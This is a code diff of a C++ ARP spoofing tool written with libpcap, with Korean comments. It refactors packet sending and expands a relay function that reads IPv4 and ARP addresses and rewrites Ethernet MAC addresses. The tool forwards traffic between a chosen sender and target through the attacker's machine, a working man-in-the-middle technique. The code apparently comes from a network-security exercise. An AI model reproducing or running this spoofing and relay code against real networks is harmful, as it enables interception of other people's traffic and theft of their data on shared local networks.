@@ -30,7 +30,6 @@ Ip Spoof::GetAttackerIP(const char* interface) {
     return Ip(ip);
 }
 
-
 void Spoof::SetDefaultArpPacket(struct EthArpPacket& packet) {
     packet.eth_.type_ = htons(EthHdr::Arp);
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -49,8 +48,8 @@ void Spoof::SetPacket(struct EthArpPacket &packet, Mac dmac, Mac smac, uint16_t 
     packet.arp_.tip_ = htonl(tip);
 }
 
-void Spoof::SendPacket(pcap_t* pcap, struct EthArpPacket& packet) {
-	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
+void Spoof::SendPacket(pcap_t* pcap, const u_char* packet, size_t size) {
+	int res = pcap_sendpacket(pcap, packet, size);
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 		exit(PCAP_ERROR);
@@ -73,7 +72,17 @@ void Spoof::GetSrcMac(pcap_t* pcap, std::string SendORTarget) {
         }
     } while (htons(etharp->eth_.type_) != EthHdr::Arp);
 
-    (SendORTarget == "Sender" ? senderMac_ : targetMac_) = etharp->arp_.smac();
+    if(SendORTarget == "Sender") {
+        senderMac_ = etharp->arp_.smac();
+    }
+    else if (SendORTarget == "Target") {
+        targetMac_ = etharp->arp_.smac();
+    }
+    else {
+        printf("Wrong ");
+        exit(-1); //TODO Error Define
+    }
+
 }
 
 void Spoof::SetSendnTargetIp(char* senderIP, char* targetIP){
@@ -81,35 +90,59 @@ void Spoof::SetSendnTargetIp(char* senderIP, char* targetIP){
     targetIP_ = Ip(targetIP);
 }
 
-void Spoof::RelayPacket(pcap_t* pcap, Mac attackerMac) {
-    //현재 arp 패킷으로 reply됨
+void Spoof::RelayPacket(pcap_t* pcap, Mac attackerMac, Ip attackerIP) {
     //패킷의 mac만 변경해서 제대로 보내기
+    //너무 많은 기능 들어가있음, 함수 나누기
     struct pcap_pkthdr* header;
     const u_char* packet;
-    
-    while (1){ // 스레드 빼서 while문 따로 동작하도록
-        int res = pcap_next_ex(pcap, &header, &packet);
+    int isSend = 0;
+        
+    int res = pcap_next_ex(pcap, &header, &packet);
 
-        struct EthArpPacket *ethArp = (struct EthArpPacket *)packet;
-        ethArp->eth_.dmac_ = targetMac_;
-        ethArp->eth_.smac_ = attackerMac;
+    u_char* cpPacket = (u_char*)malloc(header->len);
+    memcpy(cpPacket, packet, header->len);
+
+    struct EthHdr *eth = (struct EthHdr *)cpPacket;
+    int ethLength = sizeof(EthHdr);
+
+    Ip sip;
+    Ip tip;
+
+    switch (ntohs(eth->type_)) {
+        case EthHdr::Ip4: {
+            struct IpHdr *ip = (struct IpHdr *) (cpPacket + ethLength);
+            sip = ntohl(Ip(ip->Sip));
+            tip = ntohl(Ip(ip->Dip));
+            break;
+        }
+            
+        case EthHdr::Arp: {
+            struct ArpHdr *arp = (struct ArpHdr *) (cpPacket + ethLength);
+            sip = ntohl(Ip(arp->sip()));
+            tip = ntohl(Ip(arp->tip()));
+            break;
+        }
+            
+        case EthHdr::Ip6:
+            //TODO
+        break;
     
-        Spoof::SendPacket(pcap, *ethArp);
+        default:
+            printf("Wrong Packet");
+            exit(-1); //TODO Error Define
+            break;
+        };
+        
+    if (sip == senderIP_ && tip == targetIP_) {
+        eth->dmac_ = targetMac_;
+        eth->smac_ = attackerMac;
+        pcap_sendpacket(pcap, cpPacket, header->len);
     }
+    else if (sip == targetIP_ && tip == senderIP_) {
+        eth->dmac_ = senderMac_;
+        eth->smac_ = attackerMac;
+        pcap_sendpacket(pcap, cpPacket, header->len);
+    }
+    free(cpPacket);
 
 }
-
-// uint16_t Spoof::CheckPacketType(pcap_t* pcap){
-//     struct pcap_pkthdr* header;
-//     const u_char* packet;
-
-//     int res = pcap_next_ex(pcap, &header, &packet);
-
-//     struct EthHdr *eth = (struct EthHdr *)packet;
-
-//     return ntohs(eth->type_); 
-// }
-
-// void Spoof::ReInfection(pcap_t* pcap, struct EthArpPacket packet) { // TODO change func name
-//     ;
-// }
